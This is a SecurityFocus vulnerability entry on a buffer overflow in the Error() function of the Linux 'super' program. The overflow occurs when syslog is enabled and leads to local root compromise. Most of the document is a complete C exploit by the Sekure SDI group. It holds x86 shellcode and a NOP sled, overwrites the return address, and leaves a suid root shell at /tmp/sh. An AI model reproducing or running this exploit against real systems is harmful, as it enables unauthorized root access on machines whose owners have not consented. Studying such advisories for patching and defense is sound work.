source: http://www.securityfocus.com/bid/342/info


After the first super buffer overflow vulnerability was discovered, another appeared shortly after. This vulnerability exists when the syslog option is enabled. The overflow is in the file error.c, in the Error() function where the buf[MAXPRINT] buffer is used with no bounds checking. The consequences of this are local root compromise. 

--------------- SDI-super.c --------------------------------------

/*

* [ Sekure SDI ]

* [ Brazilian Info Security Team ]

* | ---------------------------------- ]

* | SUPER exploit for linux |

* | ---------------------------------- |

* | |

* | http://ssc.sekure.org |

* | Sekure SDI Secure Coding Team |

* | |

* | ---------------------------------- |

* | by c0nd0r <condor@sekure.org> |

* | ---------------------------------- |

* [ thanks for the ppl at sekure.org: ]

* [ jamez(shellcode), bishop, dumped, ]

* [ bahamas, fcon, vader, yuckfoo. ]

*

*

* This will exploit a buffer overflow condition in the log section of

* the SUPER program.

*

* It will create a suid bash owned by root at /tmp/sh.

* (It'll defeat the debian bash-2.xx protection against rootshell)

*

* Note: The SUPER program must be compiled with the SYSLOG option.

*

* also thanks people from #uground (irc.brasnet.org network)

*

*/

char shellcode[] =

"\xeb\x31\x5e\x89\x76\x32\x8d\x5e\x08\x89\x5e\x36"

"\x8d\x5e\x0b\x89\x5e\x3a\x31\xc0\x88\x46\x07\x88"

"\x46\x0a\x88\x46\x31\x89\x46\x3e\xb0\x0b\x89\xf3"

"\x8d\x4e\x32\x8d\x56\x3e\xcd\x80\x31\xdb\x89\xd8"

"\x40\xcd\x80\xe8\xca\xff\xff\xff"

"/bin/sh -c cp /bin/sh /tmp/sh; chmod 4755 /tmp/sh";

unsigned long getsp ( void) {

__asm__("mov %esp,%eax");

}

main ( int argc, char *argv[] ) {

char itamar[2040]; // ta mar mesmo

long addr;

int x, y, offset = 1000, align=0;

if ( argc > 1) offset = atoi(argv[1]);

addr = getsp() + offset;

for ( x = 0; x < (1410-strlen(shellcode)); x++)

itamar[x] = 0x90;

for ( ; y < strlen(shellcode); x++, y++)

itamar[x] = shellcode[y];

for ( ; x < 1500; x+=4) {

itamar[x ] = (addr & 0xff000000) >> 24;

itamar[x+1] = (addr & 0x000000ff);

itamar[x+2] = (addr & 0x0000ff00) >> 8;

itamar[x+3] = (addr & 0x00ff0000) >> 16;

}

itamar[x++] = '\0';

printf ( "\nwargames at 0x%x, offset %d\n", addr, offset);

printf ( "Look for a suid shell root owned at /tmp/sh\n");

execl ( "/usr/local/bin/super", "super", "-T",itamar, (char *) 0);

} 